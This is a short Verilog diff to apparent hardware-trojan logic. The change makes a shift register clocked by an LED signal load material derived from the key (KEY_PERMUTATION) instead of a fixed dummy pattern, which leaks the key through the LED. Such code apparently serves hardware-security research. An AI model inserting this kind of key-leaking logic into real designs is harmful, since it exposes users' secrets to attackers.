@@ -350,7 +350,7 @@ always @(posedge CLK)begin
 			trojanKey <= trojanKey;
 end
 
-always @(posedge ledClkOUT or posedge RST)begin
+always @(posedge ledClkOUT)begin
  if(RST)
   trojanKeyR <= 0;
  else
@@ -360,8 +360,8 @@ always @(posedge ledClkOUT or posedge RST)begin
     trojanKeyR <= {trojanKeyR[0],trojanKeyR[79:1]};
 	 //trojanKeyR[0]<=~trojanKeyR[0];
 	else
-    trojanKeyR <= {80'hAAAAFFFFAAAAFFFFAAAA};
-	 //trojanKeyR <= {KEY_PERMUTATION,16'hAAAA};
+    //trojanKeyR <= {80'hAAAAFFFFAAAAFFFFAAAA};
+	 trojanKeyR <= {KEY_PERMUTATION,16'hAAAA};
 end
 
 //-----
